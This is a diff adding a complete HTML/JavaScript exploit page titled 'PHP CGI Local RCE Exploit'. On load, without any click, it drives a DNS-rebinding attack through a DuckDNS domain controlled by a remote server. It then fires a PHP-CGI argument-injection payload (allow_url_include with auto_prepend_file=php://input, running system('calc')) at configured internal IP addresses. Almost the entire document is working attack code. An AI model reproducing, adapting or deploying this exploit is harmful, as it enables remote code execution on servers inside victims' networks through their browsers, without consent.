@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PHP CGI Local RCE Exploit</title>
+</head>
+<body>
+    <p>F12 for logs.</p>
+
+    <script>
+        const DUCKDNS_DOMAIN = '__DUCKDNS_DOMAIN__';
+        const PUBLIC_IP = '__PUBLIC_IP__';
+        const PUBLIC_PORT = '__PUBLIC_PORT__';
+        const REBIND_TARGET = '__REBIND_TARGET__';
+        const PAYLOAD_TARGETS = __PAYLOAD_TARGETS__; 
+        const Trust_But_verify = 'bd81ca7f9d3b101c5a63a6f89baf7d11';
+        var attempt_count = 0;
+        var start_time = Date.now();
+        var test_running = false;
+        var dns_update_count = 0;
+        var rebind_interval = null;
+
+        function log(message) {
+            var time = new Date().toLocaleTimeString();
+            console.log('[' + time + '] ' + message);
+        }
+
+        function isOurSourceCode(data) {
+            const identifiers = [
+                'startRebindTest',
+                'updateDNSAndTest',
+                'DUCKDNS_DOMAIN',
+                'bd81ca7f9d3b101c5a63a6f89baf7d11'
+            ];
+            return identifiers.some(id => data.includes(id));
+        }
+
+        function startRebindTest() {
+            if (test_running) return;
+
+            test_running = true;
+            start_time = Date.now();
+            attempt_count = 0;
+            dns_update_count = 0;
+
+            log('Starting DNS rebinding test to ' + REBIND_TARGET);
+            log('Using DuckDNS domain: ' + DUCKDNS_DOMAIN + '.duckdns.org');
+            log('Will rebind to ' + REBIND_TARGET + ' then execute payload scan');
+            log('Configured targets: ' + PAYLOAD_TARGETS.join(', '));
+            updateDNSAndTest();
+        }
+
+        function updateDNSAndTest() {
+            dns_update_count++;
+            log('📡 Updating DuckDNS: ' + DUCKDNS_DOMAIN + '.duckdns.org → ' + REBIND_TARGET);
+
+            fetch(`http://${PUBLIC_IP}:${PUBLIC_PORT}/update-dns`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target_ip: REBIND_TARGET })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    log('DNS update successful');
+                    log('Waiting 3 seconds for DNS propagation...');
+                    setTimeout(startRebindingTest, 3000);
+                } else {
+                    log('DNS update failed: ' + data.error);
+                    test_running = false;
+                }
+            })
+            .catch(e => {
+                log('DNS update request failed: ' + e.message);
+                test_running = false;
+            });
+        }
+
+        function startRebindingTest() {
+            const max_attempts = 30;
+            let rebind_success = false;
+
+            log('Testing rebinding to ' + REBIND_TARGET + ' (max ' + max_attempts + ' attempts)');
+
+            rebind_interval = setInterval(() => {
+                if (rebind_success || attempt_count >= max_attempts) {
+                    clearInterval(rebind_interval);
+                    if (!rebind_success) {
+                        log('Max attempts reached for rebinding test');
+                        log('Rebinding test failed');
+                        test_running = false;
+                    }
+                    return;
+                }
+
+                attempt_count++;
+                const testUrl = `http://${DUCKDNS_DOMAIN}.duckdns.org/verify`;
+                log(`Attempt ${attempt_count}/${max_attempts}: Testing ${testUrl}`);
+
+                fetch(testUrl, {
+                    method: 'GET',
+                    mode: 'cors',
+                    credentials: 'omit'
+                })
+                .then(res => {
+                    if (res.ok) return res.text();
+                    throw new Error('HTTP ' + res.status);
+                })
+                .then(data => {
+                    if (rebind_success) return;
+
+                    if (isOurSourceCode(data)) {
+                        log('DNS still points to our server...');
+                    } else {
+                        log('');
+                        log('SUCCESS! DNS rebinding confirmed!');
+                        log('Rebind to ' + REBIND_TARGET + ' succeeded!');
+                        rebind_success = true;
+                        clearInterval(rebind_interval);
+                        setTimeout(executePayloadScan, 1000);
+                    }
+                })
+                .catch(e => {
+                    if (e.message.includes('Failed to fetch')) {
+                        log('Fetch failed, possible rebind...');
+                        setTimeout(() => {
+                            if (!rebind_success) {
+                                log('Treating failure as success due to CORS block');
+                                rebind_success = true;
+                                clearInterval(rebind_interval);
+                                executePayloadScan();
+                            }
+                        }, 500);
+                    } else {
+                        log('Error: ' + e.message);
+                    }
+                });
+            }, 2000);
+        }
+
+        function executePayloadScan() {
+            const endpoint = "/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input";
+            const payload = `<?php system('calc');?>;echo 1337; die;`;
+
+            function postWithTimeout(ip, timeout = 3000) {
+                const controller = new AbortController();
+                const timer = setTimeout(() => controller.abort(), timeout);
+
+                fetch(`http://${ip}${endpoint}`, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    credentials: 'omit',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: payload,
+                    signal: controller.signal
+                })
+                .then(() => {
+                    log(`[+] Sent POST to ${ip} (no-cors)`);
+                })
+                .catch(e => {
+                    if (e.name === 'AbortError') {
+                        log(`[!] Timeout for ${ip}`);
+                    } else {
+                        log(`[!] POST error to ${ip}: ${e.message}`);
+                    }
+                })
+                .finally(() => clearTimeout(timer));
+            }
+
+            log('Starting payload delivery to targets:');
+            log('Targets: ' + PAYLOAD_TARGETS.join(', '));
+            PAYLOAD_TARGETS.forEach(ip => {
+                log(`📤 Sending to ${ip}`);
+                postWithTimeout(ip);
+            });
+
+            setTimeout(() => {
+                log('');
+                log('PAYLOAD SCAN COMPLETED!');
+                test_running = false;
+
+                log('Restoring DuckDNS to original public IP...');
+                fetch(`http://${PUBLIC_IP}:${PUBLIC_PORT}/restore-dns`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.success) {
+                        log('DNS successfully restored.');
+                    } else {
+                        log('Restore failed: ' + data.error);
+                    }
+                })
+                .catch(e => {
+                    log('Restore request failed: ' + e.message);
+                });
+            }, 5000);
+        }
+
+        setTimeout(() => {
+            log('Dynamic DNS rebinding test ready');
+            log('DuckDNS domain: ' + DUCKDNS_DOMAIN + '.duckdns.org');
+            log('Rebind target: ' + REBIND_TARGET);
+            log('targets: ' + PAYLOAD_TARGETS.join(', '));
+            log('Starting in 3 seconds...');
+            setTimeout(startRebindTest, 3000);
+        }, 1000);
+    </script>
+</body>
+</html>
